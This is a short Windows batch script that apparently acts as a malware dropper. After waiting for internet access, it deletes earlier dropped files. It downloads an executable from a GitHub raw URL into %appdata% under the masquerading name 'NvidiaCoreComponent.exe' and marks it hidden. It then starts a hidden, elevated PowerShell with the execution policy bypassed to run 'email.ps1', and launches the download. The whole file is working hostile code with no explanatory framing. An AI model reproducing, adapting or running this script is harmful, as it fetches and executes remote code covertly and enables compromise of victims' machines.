@echo off
:while
ping www.google.com -n 1 | find "TTL="
IF %ERRORLEVEL% EQU 0 ( goto :run ) else ( goto :while )

:run
if exist %appdata%\Microsoft\pass.ps1 (del /f %appdata%\Microsoft\pass.ps1)
if exist %appdata%\Microsoft\privup.bat (del /f %appdata%\Microsoft\privup.bat)
if exist %appdata%\Microsoft\NvidiaCoreComponent.exe ( goto :execute ) else (goto :download)

:download
powershell -command "Invoke-WebRequest -Uri 'https://github.com/4V4loon/tools/blob/master/Client.exe?raw=true' -OutFile $env:appdata\Microsoft\NvidiaCoreComponent.exe"
attrib +h %appdata%\Microsoft\NvidiaCoreComponent.exe
goto :execute

:execute
powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:appdata\Microsoft\email.ps1' -WindowStyle Hidden -Verb RunAs"
cd %appdata%\Microsoft
.\NvidiaCoreComponent.exe
exit
